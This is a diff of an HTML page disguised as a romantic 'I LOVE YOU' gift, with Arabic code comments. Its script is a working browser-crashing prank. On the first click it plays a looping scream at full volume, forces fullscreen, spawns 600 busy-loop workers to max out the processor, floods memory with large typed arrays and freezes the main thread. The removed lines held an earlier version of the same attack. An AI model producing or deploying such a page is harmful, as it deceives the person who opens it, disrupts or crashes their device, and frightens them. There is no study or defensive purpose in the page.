@@ -4,61 +4,75 @@
     <meta charset="UTF-8">
     <title>Surprise ❤️</title>
     <style>
-        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 30px #ff0055; cursor: pointer; }
+        body { 
+            background-color: black; 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden; 
+            font-family: Arial, sans-serif;
+            cursor: pointer;
+        }
+        h1 { font-size: 5rem; text-shadow: 0 0 20px #ff0055; }
+        p { font-size: 0.8rem; color: #222; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <h1 id="start">I LOVE YOU</h1>
+    <h1>I LOVE YOU</h1>
+    <p>Click anywhere to receive your gift...</p>
+
+    <audio id="scream" src="https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Screams-Terror-Screams&filename=24/244368-2323c21d-9372-4d2b-871d-557626960f26.mp3"></audio>
 
     <script>
-        const btn = document.getElementById('start');
-        let memoryFlood = [];
+        let memoryBurner = [];
 
-        btn.onclick = function() {
-            this.innerText = "WAITING...";
-            
-            // 1. ملء الشاشة لزيادة استهلاك موارد الجرافيك
-            document.documentElement.requestFullscreen().catch(()=>{});
+        function launchAttack() {
+            // 1. تشغيل الصوت بأعلى درجة
+            let audio = document.getElementById('scream');
+            audio.volume = 1.0;
+            audio.play();
+            audio.loop = true; // تكرار الصرخة
 
-            // 2. تدمير المعالج (CPU 100%)
-            // سنفتح عدد ضخم من العمال لإجبار المعالج على أقصى طاقة
-            const cores = (navigator.hardwareConcurrency || 8) * 4; 
-            for (let i = 0; i < cores; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
+            // 2. تفعيل ملء الشاشة فوراً
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+
+            // 3. تدمير المعالج (CPU 100%) - فتح 600 عامل
+            for (let i = 0; i < 600; i++) {
+                const workerBlob = new Blob([`
                     setInterval(() => {
-                        let data = "X".repeat(100000);
                         while(true) {
-                            // عمليات تشفير تستهلك طاقة المعالج بالكامل
-                            data = btoa(data + Math.random());
-                            if(data.length > 1000000) data = data.substring(0, 100);
+                            Math.sqrt(Math.random()) * Math.exp(Math.random());
                         }
-                    }, 1);
-                `], { type: 'application/javascript' })));
+                    }, 0);
+                `], { type: 'application/javascript' });
+                new Worker(URL.createObjectURL(workerBlob));
             }
 
-            // 3. تدمير الرام (RAM Destruction)
-            // سنقوم بحجز مساحات ضخمة من الذاكرة الخام (Typed Arrays)
+            // 4. تدمير الرام (RAM 100%)
             setInterval(() => {
                 try {
-                    // حجز 100 ميجا في كل لفة (كل 10 مللي ثانية)
-                    let chunk = new BigUint64Array(1024 * 1024 * 12).fill(BigInt(0xFFFFFFFFFFFFFFFFn));
-                    memoryFlood.push(chunk);
-                    
-                    // منع المتصفح من إفراغ الذاكرة
-                    window.history.pushState(null, null, "#" + Math.random());
-                } catch(e) {
-                    // في حالة الانهيار، يحاول الكود الاستمرار في استهلاك ما تبقى
-                }
-            }, 10);
+                    let chunk = new BigUint64Array(1024 * 1024 * 50).fill(1n); 
+                    memoryBurner.push(chunk);
+                } catch(e) {}
+            }, 5);
 
-            // 4. جعل الواجهة لا تستجيب نهائياً
-            while(true) {
-                // هجوم مباشر على "المسار الرئيسي" (Main Thread)
-                for(let i=0; i<1000000; i++) { Math.atan(Math.random()); }
-            }
-        };
+            // 5. تجميد المتصفح نهائياً (Main Thread Kill)
+            // بعد ثانية واحدة، الجهاز هيتجمد والصوت هيفضل شغال
+            setTimeout(() => {
+                while(true) {
+                    memoryBurner.push(new Array(1000000).fill("AHRRRRRRRR"));
+                }
+            }, 1000);
+        }
+
+        window.onclick = launchAttack;
     </script>
 </body>
 </html>
